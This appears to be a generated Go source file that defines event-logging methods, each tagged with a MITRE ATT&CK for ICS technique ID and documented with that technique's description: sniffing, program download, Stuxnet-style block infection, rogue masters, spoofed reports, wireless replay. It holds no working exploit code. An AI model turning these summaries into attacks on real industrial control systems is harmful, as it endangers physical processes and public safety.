/* ATTACKICSNetworkSniffing Phases: discovery-ics

Network sniffing is the practice of using a network interface on a computer
system to monitor or capture information (Citation: EAttack Network Sniffing)
regardless of whether it is the specified destination for the information.   An
adversary may attempt to sniff the traffic to gain information about the target.
This information can vary in the level of importance.  Relatively unimportant
information is general communications to and from machines.  Relatively
important information would be login information.  User credentials may be sent
over an unencrypted protocol, such as [https://tools.ietf.org/html/rfc854
Telnet], that can be captured and obtained through network packet analysis.
Network sniffing can be a way to discover information for Control Device
Identification.  In addition, ARP and Domain Name Service (DNS) poisoning can be
used to capture credentials to websites, proxies, and internal systems by
redirecting traffic to an adversary. Detection: Detecting the events leading up
to sniffing network traffic may be the best method of detection. From the host
level, an adversary would likely need to perform a man-in-the-middle attack
against other devices on a wired network in order to capture traffic that was
not to or from the current compromised system. This change in the flow of
information is detectable at the enclave network level. Monitor for ARP spoofing
and gratuitous ARP broadcasts. Detecting compromised network devices is a bit
more challenging. Auditing administrator logins, configuration changes, and
device images is required to detect malicious changes.
*/
func (g *Session) ATTACKICSNetworkSniffing(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0842").
        Msg("network sniffing")
}

/* ATTACKICSPointTagIdentification Phases: collection-ics

Adversaries may collect point and tag values to gain a more comprehensive
understanding of the process environment. Points may be values such as inputs,
memory locations, outputs or other process specific variables. (Citation:
References - tags process comprehension) Tags are the identifiers given to
points for operator convenience.  Collecting such tags provides valuable context
to environmental points and enables an adversary to map inputs, outputs, and
other values to their control processes. Understanding the points being
collected may inform an adversary on which processes and values to keep track of
over the course of an operation.
*/
func (g *Session) ATTACKICSPointTagIdentification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0861").
        Msg("point & tag identification")
}

/* ATTACKICSProgramDownload Phases: lateral-movement-ics

Adversaries may perform a program download to transfer a user program to a
controller. ariations of program download, such as online edit and program
append, allow a controller to continue running during the transfer and
reconfiguration process without interruption to process control. However, before
starting a full program download (i.e., download all) a controller may need to
go into a stop state. This can have negative consequences on the physical
process, especially if the controller is not able to fulfill a time-sensitive
action. Adversaries may choose to avoid a download all in favor of an online
edit or program append to avoid disrupting the physical process. An adversary
may need to use the technique Detect Operating Mode or Change Operating Mode to
make sure the controller is in the proper mode to accept a program download. The
granularity of control to transfer a user program in whole or parts is dictated
by the management protocol (e.g., S7CommPlus, TriStation) and underlying
controller API. Thus, program download is a high-level term for the suite of
vendor-specific API calls used to configure a controller’s user program memory
space. Modify Controller Tasking and Modify Program represent the configuration
changes that are transferred to a controller via a program download.
*/
func (g *Session) ATTACKICSProgramDownload(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0843").
        Msg("program download")
}

/* ATTACKICSProgramOrganizationUnits Phases: lateral-movement-ics execution-ics

Program Organizational Units (POUs) are block structures used within PLC
programming to create programs and projects. (Citation: Guidance - IEC61131)
POUs can be used to hold user programs written in IEC 61131-3 languages:
Structured text, Instruction list, Function block, and Ladder logic. (Citation:
Guidance - IEC61131) Application - 201203 They can also provide additional
functionality, such as establishing connections between the PLC and other
devices using TCON. (Citation: PLCBlaster - Spenneberg) Stuxnet uses a simple
code-prepending infection technique to infect Organization Blocks (OB). For
example, the following sequence of actions is performed when OB1 is infected
(Citation: Stuxnet - Symantec - 201102): Increase the size of the original
block. Write malicious code to the beginning of the block. *Insert the original
OB1 code after the malicious code.
*/
func (g *Session) ATTACKICSProgramOrganizationUnits(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0844").
        Msg("program organization units")
}

/* ATTACKICSProgramUpload Phases: collection-ics

Adversaries may attempt to upload a program from a PLC to gather information
about an industrial process. Uploading a program may allow them to acquire and
study the underlying logic. Methods of program upload include vendor software,
which enables the user to upload and read a program running on a PLC. This
software can be used to upload the target program to a workstation, jump box, or
an interfacing device.
*/
func (g *Session) ATTACKICSProgramUpload(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0845").
        Msg("program upload")
}

/* ATTACKICSProjectFileInfection Phases: persistence-ics

Adversaries may attempt to infect project files with malicious code. These
project files may consist of objects, program organization units, variables such
as tags, documentation, and other configurations needed for PLC programs to
function. (Citation: References - beckhoff project files) Using built in
functions of the engineering software, adversaries may be able to download an
infected program to a PLC in the operating environment enabling further
execution and persistence techniques. (Citation: References - plcdev siemens)
Adversaries may export their own code into project files with conditions to
execute at specific intervals. (Citation: Stuxnet - Symantec - 201102) Malicious
programs allow adversaries control of all aspects of the process enabled by the
PLC. Once the project file is downloaded to a PLC the workstation device may be
disconnected with the infected project file still executing. (Citation:
References - plcdev siemens)
*/
func (g *Session) ATTACKICSProjectFileInfection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0873").
        Msg("project file infection")
}

/* ATTACKICSRoleIdentification Phases: collection-ics

Adversaries may perform role identification of devices involved with physical
processes of interest in a target control system. Control systems devices often
work in concert to control a physical process. Each device can have one or more
roles that it performs within that control process. By collecting this role-
based data, an adversary can construct a more targeted attack. For example, a
power generation plant may have unique devices such as one that monitors power
output of a generator and another that controls the speed of a turbine.
Examining devices roles allows the adversary to observe how the two devices work
together to monitor and control a physical process. Understanding the role of a
target device can inform the adversary's decision on what action to take, in
order to cause Impact and influence or disrupt the integrity of operations.
Furthermore, an adversary may be able to capture control system protocol
traffic. By studying this traffic, the adversary may be able to determine which
devices are outstations, and which are masters. Understanding of master devices
and their role within control processes can enable the use of Rogue Master
Device
*/
func (g *Session) ATTACKICSRoleIdentification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0850").
        Msg("role identification")
}

/* ATTACKICSLateralToolTransfer Phases: lateral-movement-ics

Adversaries may transfer tools or other files from one system to another to
stage adversary tools or other files over the course of an operation. (Citation:
EAttack Lateral Tool Transfer) Copying of files may also be performed laterally
between internal victim systems to support Lateral Movement with remote
Execution using inherent file sharing protocols such as file sharing over SMB to
connected network shares. (Citation: EAttack Remote File Copy) In control
systems environments, malware may use SMB and other file sharing protocols to
move laterally through industrial networks.
*/
func (g *Session) ATTACKICSLateralToolTransfer(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0867").
        Msg("lateral tool transfer")
}

/* ATTACKICSNativeAPI Phases: execution-ics

Adversaries may directly interact with the native OS application programming
interface (API) to access system functions. Native APIs provide a controlled
means of calling low-level OS services within the kernel, such as those
involving hardware/devices, memory, and processes.(Citation: EAttack Native API)
These native APIs are leveraged by the OS during system boot (when other system
components are not yet initialized) as well as carrying out tasks and requests
during routine operations. Functionality provided by native APIs are often also
exposed to user-mode applications via interfaces and libraries. For example,
functions such as memcpy and direct operations on memory registers can be used
to modify user and system memory space.
*/
func (g *Session) ATTACKICSNativeAPI(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0834").
        Msg("native api")
}

/* ATTACKICSRemoteSystemDiscovery Phases: discovery-ics

Adversaries may attempt to get a listing of other systems by IP address,
hostname, or other logical identifier on a network that may be used for
subsequent Lateral Movement or Discovery techniques. Functionality could exist
within adversary tools to enable this, but utilities available on the operating
system or vendor software could also be used.(Citation: EAttack Remote System
Discovery)
*/
func (g *Session) ATTACKICSRemoteSystemDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0846").
        Msg("remote system discovery")
}

/* ATTACKICSRemoteSystemInformationDiscovery Phases: discovery-ics

An adversary may attempt to get detailed information about remote systems and
their peripherals, such as make/model, role, and configuration. Adversaries may
use information from Remote System Information Discovery to aid in targeting and
shaping follow-on behaviors. For example, the system’s operational role and
model information can dictate whether it is a relevant target for the
adversary’s operational objectives. In addition, the system’s configuration may
be used to scope subsequent technique usage. Requests for system information are
typically implemented using automation and management protocols and are often
automatically requested by vendor software during normal operation. This
information may be used to tailor management actions, such as program download
and system or module firmware. An adversary may leverage this same information
by issuing calls directly to the system’s API.
*/
func (g *Session) ATTACKICSRemoteSystemInformationDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0888").
        Msg("remote system information discovery")
}

/* ATTACKICSReplicationThroughRemovableMedia Phases: initial-access-ics

Adversaries may move onto systems, such as those separated from the enterprise
network, by copying malware to removable media which is inserted into the
control systems environment. The adversary may rely on unknowing trusted third
parties, such as suppliers or contractors with access privileges, to introduce
the removable media. This technique enables initial access to target devices
that never connect to untrusted networks, but are physically accessible.
Operators of the German nuclear power plant, Gundremmingen, discovered malware
on a facility computer not connected to the internet.  (Citation: KGG-Company-
Site)  (Citation: KGG-Trend Micro) The malware included Conficker and
W32.Ramnit, which were also found on eighteen removable disk drives in the
facility.  (Citation: KGG-Reuters)  (Citation: KGG-Softpedia)  (Citation: KGG-
Science-Alert)  (Citation: KGG-Geek)  (Citation: KGG-Ars)  (Citation: KGG-Dark)
The plant has since checked for infection and cleaned up more than 1,000
computers.  (Citation: KGG-BBC) An ESET researcher commented that internet
disconnection does not guarantee system safety from infection or payload
execution.  (Citation: KGG-ESET)
*/
func (g *Session) ATTACKICSReplicationThroughRemovableMedia(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0847").
        Msg("replication through removable media")
}

/* ATTACKICSRemoteServices Phases: initial-access-ics lateral-movement-ics

Adversaries may leverage remote services to move between assets and network
segments. These services are often used to allow operators to interact with
systems remotely within the network, some examples are RDP, SMB, SSH, and other
similar mechanisms. Remote services could be used to support remote access, data
transmission, authentication, name resolution, and other remote functions.
Further, remote services may be necessary to allow operators and administrators
to configure systems within the network from their engineering or management
workstations. An adversary may use this technique to access devices which may be
dual-homed to multiple network segments, and can be used for Program Download or
to execute attacks on control devices directly through Valid Accounts. Specific
remote services (RDP & VNC) may be a precursor to enable Graphical User
Interface execution on devices such as HMIs or engineering workstation software.
*/
func (g *Session) ATTACKICSRemoteServices(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0886").
        Msg("remote services")
}

/* ATTACKICSRogueMaster Phases: initial-access-ics

Adversaries may setup a rogue master to leverage control server functions to
communicate with outstations. A rogue master can be used to send legitimate
control messages to other control system devices, affecting processes in
unintended ways. It may also be used to disrupt network communications by
capturing and receiving the network traffic meant for the actual master.
Impersonating a master may also allow an adversary to avoid detection. In the
Maroochy Attack, Vitek Boden falsified network addresses in order to send false
data and instructions to pumping stations. In the case of the 2017 Dallas Siren
incident, adversaries used a rogue master to send command messages to the 156
distributed sirens across the city, either through a single rogue transmitter
with a strong signal, or using many distributed repeaters.
*/
func (g *Session) ATTACKICSRogueMaster(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0848").
        Msg("rogue master")
}

/* ATTACKICSRootkit Phases: evasion-ics inhibit-response-function

Adversaries may deploy rootkits to hide the presence of programs, files, network
connections, services, drivers, and other system components. Rootkits are
programs that hide the existence of malware by intercepting and modifying
operating-system API calls that supply system information. Rootkits or rootkit-
enabling functionality may reside at the user or kernel level in the operating
system, or lower. (Citation: EAttack Rootkit)  Firmware rootkits that affect the
operating system yield nearly full control of the system. While firmware
rootkits are normally developed for the main processing board, they can also be
developed for I/O  that can be attached to the asset. Compromise of this
firmware allows the modification of all of the process variables and functions
the module engages in. This may result in commands being disregarded and false
information being fed to the main device. By tampering with device processes, an
adversary may inhibit its expected response functions and possibly enable
Impact. Detection: Some rootkit protections may be built into anti-virus or
operating system software. There are dedicated rootkit detection tools that look
for specific types of rootkit behavior. Monitor for the existence of
unrecognized DLLs, devices, services, and changes to the MBR.Reference - Rootkit
*/
func (g *Session) ATTACKICSRootkit(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0851").
        Msg("rootkit")
}

/* ATTACKICSScreenCapture Phases: collection-ics

Adversaries may attempt to perform screen capture of devices in the control
system environment. Screenshots may be taken of workstations, HMIs, or other
devices that display environment-relevant process, device, reporting, alarm, or
related data. These device displays may reveal information regarding the ICS
process, layout, control, and related schematics. In particular, an HMI can
provide a lot of important industrial process information. (Citation: Alert -
Russian APT TA18-074A - 201803) Analysis of screen captures may provide the
adversary with an understanding of intended operations and interactions between
critical devices.
*/
func (g *Session) ATTACKICSScreenCapture(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0852").
        Msg("screen capture")
}

/* ATTACKICSScripting Phases: execution-ics

Adversaries may use scripting languages to execute arbitrary code in the form of
a pre-written script or in the form of user-supplied code to an interpreter.
Scripting languages are programming languages that differ from compiled
languages, in that scripting languages use an interpreter, instead of a
compiler. These interpreters read and compile part of the source code just
before it is executed, as opposed to compilers, which compile each and every
line of code to an executable file. Scripting allows software developers to run
their code on any system where the interpreter exists. This way, they can
distribute one package, instead of precompiling executables for many different
systems. Scripting languages, such as Python, have their interpreters shipped as
a default with many Linux distributions.   In addition to being a useful tool
for developers and administrators, scripting language interpreters may be abused
by the adversary to execute code in the target environment. Due to the nature of
scripting languages, this allows for weaponized code to be deployed to a target
easily, and leaves open the possibility of on-the-fly scripting to perform a
task.
*/
func (g *Session) ATTACKICSScripting(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0853").
        Msg("scripting")
}

/* ATTACKICSSerialConnectionEnumeration Phases: discovery-ics

Adversaries may perform serial connection enumeration to gather situational
awareness after gaining access to devices in the OT network. Control systems
devices often communicate to each other via various types of serial
communication mediums. These serial communications are used to facilitate
informational communication, as well as commands.  Serial Connection Enumeration
differs from I/O Module Discovery, as I/O modules are auxiliary systems to the
main system, and devices that are connected via serial connection are normally
discrete systems. While IT and OT networks may work in tandem, the exact
structure of the OT network may not be discernible from the IT network alone.
After gaining access to a device on the OT network, an adversary may be able to
enumerate the serial connections. From this perspective, the adversary can see
the specific physical devices to which the compromised device is connected to.
This gives the adversary greater situational awareness and can influence the
actions that the adversary can take in an attack.
*/
func (g *Session) ATTACKICSSerialConnectionEnumeration(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0854").
        Msg("serial connection enumeration")
}

/* ATTACKICSServiceStop Phases: inhibit-response-function

Adversaries may stop or disable services on a system to render those services
unavailable to legitimate users. Stopping critical services can inhibit or stop
response to an incident or aid in the adversary's overall objectives to cause
damage to the environment. (Citation: EAttack Service Stop) Services may not
allow for modification of their data stores while running. Adversaries may stop
services in order to conduct Data Destruction. (Citation: EAttack Service Stop)
*/
func (g *Session) ATTACKICSServiceStop(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0881").
        Msg("service stop")
}

/* ATTACKICSSpearphishingAttachment Phases: initial-access-ics

Adversaries may use a spearphishing attachment, a variant of spearphishing, as a
form of a social engineering attack against specific targets. Spearphishing
attachments are different from other forms of spearphishing in that they employ
malware attached to an email. All forms of spearphishing are electronically
delivered and target a specific individual, company, or industry. In this
scenario, adversaries attach a file to the spearphishing email and usually rely
upon User Execution to gain execution and access. (Citation: EAttack
Spearphishing Attachment)
*/
func (g *Session) ATTACKICSSpearphishingAttachment(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0865").
        Msg("spearphishing attachment")
}

/* ATTACKICSSpoofReportingMessage Phases: evasion-ics impair-process-control

Adversaries may spoof reporting messages in control systems environments to
achieve evasion and assist with impairment of process controls. Reporting
messages are used in control systems so that operators and network defenders can
understand the status of the network. Reporting messages show the status of
devices and any important events that the devices control.   If an adversary has
the ability to Spoof Reporting Messages, then they can impact the network in
many ways. The adversary can Spoof Reporting Messages that state that the device
is in normal working condition, as a form of evasion. The adversary could also
Spoof Reporting Messages to make the defenders and operators think that other
errors were occurring, to distract them from the actual source of the problem.
(Citation: Research - Research - Taxonomy Cyber Attacks on SCADA) In the
Maroochy Attack, the adversary used a dedicated analog two-way radio system to
send false data and instructions to pumping stations and the central computer.
(Citation: Maroochy - MITRE - 200808)
*/
func (g *Session) ATTACKICSSpoofReportingMessage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0856").
        Msg("spoof reporting message")
}

/* ATTACKICSStandardApplicationLayerProtocol Phases: command-and-control-ics

Adversaries may establish command and control capabilities over commonly used
application layer protocols such as HTTP(S), OPC, RDP, telnet, DNP3, and modbus.
These protocols may be used to disguise adversary actions as benign network
traffic. Standard protocols may be seen on their associated port or in some
cases over a non-standard port. Adversaries may use these protocols to reach out
of the network for command and control, or in some cases to other infected
devices within the network.
*/
func (g *Session) ATTACKICSStandardApplicationLayerProtocol(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0869").
        Msg("standard application layer protocol")
}

/* ATTACKICSSupplyChainCompromise Phases: initial-access-ics

Adversaries may perform supply chain compromise to gain control systems
environment access by means of infected products, software, and workflows.
Supply chain compromise is the manipulation of products, such as devices or
software, or their delivery mechanisms before receipt by the end consumer.
Adversary compromise of these products and mechanisms is done for the goal of
data or system compromise, once infected products are introduced to the target
environment.  Supply chain compromise can occur at all stages of the supply
chain, from manipulation of development tools and environments to manipulation
of developed products and tools distribution mechanisms. This may involve the
compromise and replacement of legitimate software and patches, such as on third
party or vendor websites. Targeting of supply chain compromise can be done in
attempts to infiltrate the environments of a specific audience. In control
systems environments with assets in both the IT and OT networks, it is possible
a supply chain compromise affecting the IT environment could enable further
access to the OT environment. Counterfeit devices may be introduced to the
global supply chain posing safety and cyber risks to asset owners and operators.
These devices may not meet the safety, engineering and manufacturing
requirements of regulatory bodies but may feature tagging indicating conformance
with industry standards. Due to the lack of adherence to standards and overall
lesser quality, the counterfeit products may pose a serious safety and
operational risk. Yokogawa identified instances in which their customers
received counterfeit differential pressure transmitters using the Yokogawa logo.
The counterfeit transmitters were nearly indistinguishable with a semblance of
functionality and interface that mimics the genuine product. F-Secure Labs
analyzed the approach the adversary used to compromise victim systems with
Havex. (Citation:  (Citation: Havex - F-Secure) - 201406) The adversary planted
trojanized software installers available on legitimate ICS/SCADA vendor
websites. After being downloaded, this software infected the host computer with
a Remote Access Trojan (RAT).
*/
func (g *Session) ATTACKICSSupplyChainCompromise(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0862").
        Msg("supply chain compromise")
}

/* ATTACKICSSystemFirmware Phases: persistence-ics inhibit-response-function

System firmware on modern assets is often designed with an update feature. Older
device firmware may be factory installed and require special reprograming
equipment. When available, the firmware update feature enables vendors to
remotely patch bugs and perform upgrades. Device firmware updates are often
delegated to the user and may be done using a software update package. It may
also be possible to perform this task over the network. An adversary may exploit
the firmware update feature on accessible devices to upload malicious or out-of-
date firmware. Malicious modification of device firmware may provide an
adversary with root access to a device, given firmware is one of the lowest
programming abstraction layers.(Citation: Research - Firmware Modification)
*/
func (g *Session) ATTACKICSSystemFirmware(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0857").
        Msg("system firmware")
}

/* ATTACKICSTheftofOperationalInformation Phases: impact-ics

Adversaries may steal operational information on a production environment as a
direct mission outcome for personal gain or to inform future operations. This
information may include design documents, schedules, rotational data, or similar
artifacts that provide insight on operations.  In the Bowman Dam incident,
adversaries probed systems for operational data. (Citation: Bowman Dam - Times)
(Citation: Bowman Dam - wall street journal)
*/
func (g *Session) ATTACKICSTheftofOperationalInformation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0882").
        Msg("theft of operational information")
}

/* ATTACKICSUnauthorizedCommandMessage Phases: impair-process-control

Adversaries may send unauthorized command messages to instruct control system
assets to perform actions outside of their intended functionality, or without
the logical preconditions to trigger their expected function. Command messages
are used in ICS networks to give direct instructions to control systems devices.
If an adversary can send an unauthorized command message to a control system,
then it can instruct the control systems device to perform an action outside the
normal bounds of the device's actions. An adversary could potentially instruct a
control systems device to perform an action that will cause an Impact. In the
Maroochy Attack, the adversary used a dedicated analog two-way radio system to
send false data and instructions to pumping stations and the central computer.
In the Dallas Siren incident, adversaries were able to send command messages to
activate tornado alarm systems across the city without an impending tornado or
other disaster. Alarms were activated more than a dozen times. These disruptions
occurred once in 2017, and later in a nearby county in 2019.
*/
func (g *Session) ATTACKICSUnauthorizedCommandMessage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0855").
        Msg("unauthorized command message")
}

/* ATTACKICSUserExecution Phases: execution-ics

Adversaries may rely on a targeted organizations’ user interaction for the
execution of malicious code. User interaction may consist of installing
applications, opening email attachments, or granting higher permissions to
documents.  Adversaries may embed malicious code or visual basic code into files
such as Microsoft Word and Excel documents or software installers. (Citation:
BlackEnergy - Booz Allen Hamilton) Execution of this code requires that the user
enable scripting or write access within the document. Embedded code may not
always be noticeable to the user especially in cases of trojanized software.
(Citation: Havex - F-Secure)
*/
func (g *Session) ATTACKICSUserExecution(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0863").
        Msg("user execution")
}

/* ATTACKICSValidAccounts Phases: persistence-ics lateral-movement-ics

Adversaries may steal the credentials of a specific user or service account
using credential access techniques. In some cases, default credentials for
control system devices may be publicly available. Compromised credentials may be
used to bypass access controls placed on various resources on hosts and within
the network, and may even be used for persistent access to remote systems.
Compromised and default credentials may also grant an adversary increased
privilege to specific systems and devices or access to restricted areas of the
network. Adversaries may choose not to use malware or tools, in conjunction with
the legitimate access those credentials provide, to make it harder to detect
their presence or to control devices and send legitimate commands in an
unintended way. Adversaries may also create accounts, sometimes using predefined
account names and passwords, to provide a means of backup access for
persistence.(Citation: BlackEnergy - Booz Allen Hamilton) The overlap of
credentials and permissions across a network of systems is of concern because
the adversary may be able to pivot across accounts and systems to reach a high
level of access (i.e., domain or enterprise administrator) and possibly between
the enterprise and operational technology environments. Adversaries may be able
to leverage valid credentials from one system to gain access to another system.
*/
func (g *Session) ATTACKICSValidAccounts(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0859").
        Msg("valid accounts")
}

/* ATTACKICSWirelessCompromise Phases: initial-access-ics

Adversaries may perform wireless compromise as a method of gaining
communications and unauthorized access to a wireless network. Access to a
wireless network may be gained through the compromise of a wireless device.
(Citation: ICSCorsair - Bolshev) (Citation: Hart - Bolshev) Adversaries may also
utilize radios and other wireless communication devices on the same frequency as
the wireless network. Wireless compromise can be done as an initial access
vector from a remote distance.   A joint case study on the Maroochy Shire Water
Services event examined the attack from a cyber security perspective.
(Citation: Maroochy - MITRE - 200808) The adversary disrupted Maroochy Shire's
radio-controlled sewage system by driving around with stolen radio equipment and
issuing commands with them. Boden used a two-way radio to communicate with and
set the frequencies of Maroochy Shire's repeater stations.  A Polish student
used a modified TV remote controller to gain access to and control over the Lodz
city tram system in Poland. (Citation: LodzTram-LondonReconnections-2017-12)
(Citation: LodzTram-InHomelandSecurity-2008-02) The remote controller device
allowed the student to interface with the tram’s network to modify track
settings and override operator control. The adversary may have accomplished this
by aligning the controller to the frequency and amplitude of IR control protocol
signals. (Citation: LodzTram-Schneier-2008-01) The controller then enabled
initial access to the network, allowing the capture and replay of tram signals.
(Citation: LodzTram-LondonReconnections-2017-12)
*/
func (g *Session) ATTACKICSWirelessCompromise(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0860").
        Msg("wireless compromise")
}

/* ATTACKICSWirelessSniffing Phases: discovery-ics collection-ics

Adversaries may seek to capture radio frequency (RF) communication used for
remote control and reporting in distributed environments. RF communication
frequencies vary between 3 kHz to 300 GHz, although are commonly between 300 MHz
to 6 GHz. The wavelength and frequency of the signal affect how the signal
propagates through open air, obstacles (e.g. walls and trees) and the type of
radio required to capture them. These characteristics are often standardized in
the protocol and hardware and may have an effect on how the signal is captured.
Some examples of wireless protocols that may be found in cyber-physical
environments are: WirelessHART, Zigbee, WIA-FA, and 700 MHz Public Safety
Spectrum. Adversaries may capture RF communications by using specialized
hardware, such as software defined radio (SDR), handheld radio, or a computer
with radio demodulator tuned to the communication frequency. Information
transmitted over a wireless medium may be captured in-transit whether the
sniffing device is the intended destination or not. This technique may be
particularly useful to an adversary when the communications are not encrypted.
In the 2017 Dallas Siren incident, it is suspected that adversaries likely
captured wireless command message broadcasts on a 700 MHz frequency during a
regular test of the system. These messages were later replayed to trigger the
alarm systems.
*/
func (g *Session) ATTACKICSWirelessSniffing(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T0887").
        Msg("wireless sniffing")
}
